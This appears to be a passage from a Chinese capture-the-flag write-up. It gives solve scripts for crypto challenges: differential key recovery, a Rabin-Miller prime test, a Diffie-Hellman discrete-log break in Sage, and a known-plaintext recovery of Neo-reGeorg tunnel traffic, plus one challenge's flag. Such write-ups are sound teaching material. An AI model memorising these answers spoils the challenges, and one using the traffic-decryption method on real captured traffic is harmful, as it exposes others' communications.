    <span class="n">plaintext1</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"请输入第一组明文："</span><span class="p">)</span>
    <span class="n">miwen1</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"请输入第一组密文："</span><span class="p">)</span>
    <span class="n">plaintext2</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"请输入第二组明文："</span><span class="p">)</span>
    <span class="n">miwen2</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"请输入第一组密文："</span><span class="p">)</span>
    <span class="n">plaintext3</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"请输入第三组明文："</span><span class="p">)</span>
    <span class="n">miwen3</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"请输入第一组密文："</span><span class="p">)</span>

    <span class="n">key_poss1</span> <span class="o">=</span> <span class="n">key_poss</span><span class="p">(</span><span class="n">plaintext1</span><span class="p">,</span> <span class="n">miwen1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">key_poss2</span> <span class="o">=</span> <span class="n">key_poss</span><span class="p">(</span><span class="n">plaintext2</span><span class="p">,</span> <span class="n">miwen2</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">key_poss3</span> <span class="o">=</span> <span class="n">key_poss</span><span class="p">(</span><span class="n">plaintext3</span><span class="p">,</span> <span class="n">miwen3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
    <span class="c1">#print(key_poss1[0],key_poss2[0],key_poss3[0],sep='\n')</span>
    <span class="n">cryptanalysis</span><span class="p">(</span><span class="n">key_poss1</span><span class="p">,</span> <span class="n">key_poss2</span><span class="p">,</span> <span class="n">key_poss3</span><span class="p">)</span>

    <span class="c1"># miyao = twoto16(key_real)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"经过差分密码分析得知，密钥为：</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">key_real</span><span class="p">)</span>
    <span class="c1"># #print("miyao:",miyao)</span>
</pre></div>
<h3 data-content="1" id="f5aebb4f08e6ab2248a4876e98c84aa6">24 素数</h3>
<p>难度：入门<br/>
该题主要考察大素数检测的知识，根据费马小定理设计的rabin_Miller算法是效率最高的算法之一，虽然并不能100%保证通过检测的数一定是素数（比如561，伪质数），但是再添加足够多的底数后，是可以保证通过检测的数绝大概率可用的（伪质数出现概率大概为2的100次方分之一），该素性检测算法现如今应用于各类加密算法。顺道一提，另一种可以确定性检测素性（不会出现误测）的AKS素性检测的基本理念也是费马小定理，只是在多项式的时间复杂度内排除掉了被检测数是所有种类的伪质数的情况。<br/>
脚本如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">random</span>
<span class="k">def</span> <span class="nf">rabin_miller</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">num</span> <span class="o">-</span> <span class="mi">1</span>
    <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">s</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">//</span> <span class="mi">2</span>
        <span class="n">t</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">for</span> <span class="n">trials</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">num</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">v</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">v</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="k">while</span> <span class="n">v</span> <span class="o">!=</span> <span class="p">(</span><span class="n">num</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">t</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">False</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
                    <span class="n">v</span> <span class="o">=</span> <span class="p">(</span><span class="n">v</span> <span class="o">**</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="n">num</span>
    <span class="k">return</span> <span class="bp">True</span>
<span class="k">def</span> <span class="nf">is_prime</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="c1"># 排除0,1和负数</span>
    <span class="k">if</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="c1"># 创建小素数的列表,可以大幅加快速度</span>
    <span class="c1"># 如果是小素数,那么直接返回true</span>
    <span class="n">small_primes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">163</span><span class="p">,</span> <span class="mi">167</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">181</span><span class="p">,</span> <span class="mi">191</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">233</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">251</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="mi">263</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">271</span><span class="p">,</span> <span class="mi">277</span><span class="p">,</span> <span class="mi">281</span><span class="p">,</span> <span class="mi">283</span><span class="p">,</span> <span class="mi">293</span><span class="p">,</span> <span class="mi">307</span><span class="p">,</span> <span class="mi">311</span><span class="p">,</span> <span class="mi">313</span><span class="p">,</span> <span class="mi">317</span><span class="p">,</span> <span class="mi">331</span><span class="p">,</span> <span class="mi">337</span><span class="p">,</span> <span class="mi">347</span><span class="p">,</span> <span class="mi">349</span><span class="p">,</span> <span class="mi">353</span><span class="p">,</span> <span class="mi">359</span><span class="p">,</span> <span class="mi">367</span><span class="p">,</span> <span class="mi">373</span><span class="p">,</span> <span class="mi">379</span><span class="p">,</span> <span class="mi">383</span><span class="p">,</span> <span class="mi">389</span><span class="p">,</span> <span class="mi">397</span><span class="p">,</span> <span class="mi">401</span><span class="p">,</span> <span class="mi">409</span><span class="p">,</span> <span class="mi">419</span><span class="p">,</span> <span class="mi">421</span><span class="p">,</span> <span class="mi">431</span><span class="p">,</span> <span class="mi">433</span><span class="p">,</span> <span class="mi">439</span><span class="p">,</span> <span class="mi">443</span><span class="p">,</span> <span class="mi">449</span><span class="p">,</span> <span class="mi">457</span><span class="p">,</span> <span class="mi">461</span><span class="p">,</span> <span class="mi">463</span><span class="p">,</span> <span class="mi">467</span><span class="p">,</span> <span class="mi">479</span><span class="p">,</span> <span class="mi">487</span><span class="p">,</span> <span class="mi">491</span><span class="p">,</span> <span class="mi">499</span><span class="p">,</span> <span class="mi">503</span><span class="p">,</span> <span class="mi">509</span><span class="p">,</span> <span class="mi">521</span><span class="p">,</span> <span class="mi">523</span><span class="p">,</span> <span class="mi">541</span><span class="p">,</span> <span class="mi">547</span><span class="p">,</span> <span class="mi">557</span><span class="p">,</span> <span class="mi">563</span><span class="p">,</span> <span class="mi">569</span><span class="p">,</span> <span class="mi">571</span><span class="p">,</span> <span class="mi">577</span><span class="p">,</span> <span class="mi">587</span><span class="p">,</span> <span class="mi">593</span><span class="p">,</span> <span class="mi">599</span><span class="p">,</span> <span class="mi">601</span><span class="p">,</span> <span class="mi">607</span><span class="p">,</span> <span class="mi">613</span><span class="p">,</span> <span class="mi">617</span><span class="p">,</span> <span class="mi">619</span><span class="p">,</span> <span class="mi">631</span><span class="p">,</span> <span class="mi">641</span><span class="p">,</span> <span class="mi">643</span><span class="p">,</span> <span class="mi">647</span><span class="p">,</span> <span class="mi">653</span><span class="p">,</span> <span class="mi">659</span><span class="p">,</span> <span class="mi">661</span><span class="p">,</span> <span class="mi">673</span><span class="p">,</span> <span class="mi">677</span><span class="p">,</span> <span class="mi">683</span><span class="p">,</span> <span class="mi">691</span><span class="p">,</span> <span class="mi">701</span><span class="p">,</span> <span class="mi">709</span><span class="p">,</span> <span class="mi">719</span><span class="p">,</span> <span class="mi">727</span><span class="p">,</span> <span class="mi">733</span><span class="p">,</span> <span class="mi">739</span><span class="p">,</span> <span class="mi">743</span><span class="p">,</span> <span class="mi">751</span><span class="p">,</span> <span class="mi">757</span><span class="p">,</span> <span class="mi">761</span><span class="p">,</span> <span class="mi">769</span><span class="p">,</span> <span class="mi">773</span><span class="p">,</span> <span class="mi">787</span><span class="p">,</span> <span class="mi">797</span><span class="p">,</span> <span class="mi">809</span><span class="p">,</span> <span class="mi">811</span><span class="p">,</span> <span class="mi">821</span><span class="p">,</span> <span class="mi">823</span><span class="p">,</span> <span class="mi">827</span><span class="p">,</span> <span class="mi">829</span><span class="p">,</span> <span class="mi">839</span><span class="p">,</span> <span class="mi">853</span><span class="p">,</span> <span class="mi">857</span><span class="p">,</span> <span class="mi">859</span><span class="p">,</span> <span class="mi">863</span><span class="p">,</span> <span class="mi">877</span><span class="p">,</span> <span class="mi">881</span><span class="p">,</span> <span class="mi">883</span><span class="p">,</span> <span class="mi">887</span><span class="p">,</span> <span class="mi">907</span><span class="p">,</span> <span class="mi">911</span><span class="p">,</span> <span class="mi">919</span><span class="p">,</span> <span class="mi">929</span><span class="p">,</span> <span class="mi">937</span><span class="p">,</span> <span class="mi">941</span><span class="p">,</span> <span class="mi">947</span><span class="p">,</span> <span class="mi">953</span><span class="p">,</span> <span class="mi">967</span><span class="p">,</span> <span class="mi">971</span><span class="p">,</span> <span class="mi">977</span><span class="p">,</span> <span class="mi">983</span><span class="p">,</span> <span class="mi">991</span><span class="p">,</span> <span class="mi">997</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">small_primes</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="c1"># 如果大数是这些小素数的倍数,那么就是合数,返回false</span>
    <span class="k">for</span> <span class="n">prime</span> <span class="ow">in</span> <span class="n">small_primes</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">num</span> <span class="o">%</span> <span class="n">prime</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
    <span class="c1"># 如果这样没有分辨出来,就一定是大整数,那么就调用rabin算法</span>
    <span class="k">return</span> <span class="n">rabin_miller</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>

<span class="c1"># 得到大整数,默认位数为1024</span>
<span class="k">def</span> <span class="nf">get_prime</span><span class="p">(</span><span class="n">key_size</span><span class="o">=</span><span class="mi">1024</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="p">(</span><span class="n">key_size</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="mi">2</span><span class="o">**</span><span class="n">key_size</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">num</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"print check number"</span><span class="p">)</span>
    <span class="n">a</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>
    <span class="n">a</span><span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">is_prime</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
</pre></div>
<h3 data-content="1" id="26690869bc261bfd7645bb4c50ef8ae8">25 键盘侠</h3>
<p>根据给出的文字<br/>
对应键盘上的按键画图案<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122634-e3ce8b54-491c-1.jpg"/><br/>
对应字符分别为<br/>
C L C K O U T H K<br/>
根据要求得到flag<br/>
flag{CLCKOUTHK}</p>
<h3 data-content="1" id="c09eb26cb7a2758087f7f2217a67b206">26 silent_peeper</h3>
<p>sage已经封装好了这个攻击，得到a,b后算出key进行AES解密即可</p>
<div class="highlight"><pre><span></span><span class="n">p</span> <span class="o">=</span> <span class="mi">174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843</span>
<span class="n">g</span> <span class="o">=</span> <span class="mi">41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977</span>
<span class="n">A</span> <span class="o">=</span> <span class="il">142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016L</span>
<span class="n">B</span> <span class="o">=</span> <span class="il">16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544L</span>
<span class="n">k</span> <span class="o">=</span> <span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="n">a</span> <span class="o">=</span> <span class="n">discrete_log_lambda</span><span class="p">(</span><span class="n">k</span><span class="p">(</span><span class="n">A</span><span class="p">),</span><span class="n">k</span><span class="p">(</span><span class="n">g</span><span class="p">),(</span><span class="mi">2</span><span class="o">**</span><span class="mi">39</span><span class="p">,</span><span class="mi">2</span><span class="o">**</span><span class="mi">40</span><span class="p">))</span>
<span class="n">b</span> <span class="o">=</span> <span class="n">discrete_log_lambda</span><span class="p">(</span><span class="n">k</span><span class="p">(</span><span class="n">B</span><span class="p">),</span><span class="n">k</span><span class="p">(</span><span class="n">g</span><span class="p">),(</span><span class="mi">2</span><span class="o">**</span><span class="mi">39</span><span class="p">,</span><span class="mi">2</span><span class="o">**</span><span class="mi">40</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</pre></div>
<h3 data-content="1" id="050bdcceebb7ee6ebdef1e4e568db0e8">27 Neo-reGeorg</h3>
<p>Neo-reGeorg 使用的一种简单的base64换表加密 这种方法在已知明文的时候十分脆弱<br/>
使用提供的日志很容易拼出第一个http请求的部分开头明文(注意流量换行使用的是\n\r)</p>
<pre><code>GET / HTTP/1.1
Host: 192.168.234.176
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</code></pre>
<p>使用base64编码后与密文对比 可以还原出大部分映射表<br/>
剩余的少量映射关系可以通过爆破得出<br/>
拿到表后即可完整解密通信流量得到flag</p>
</div>
</div>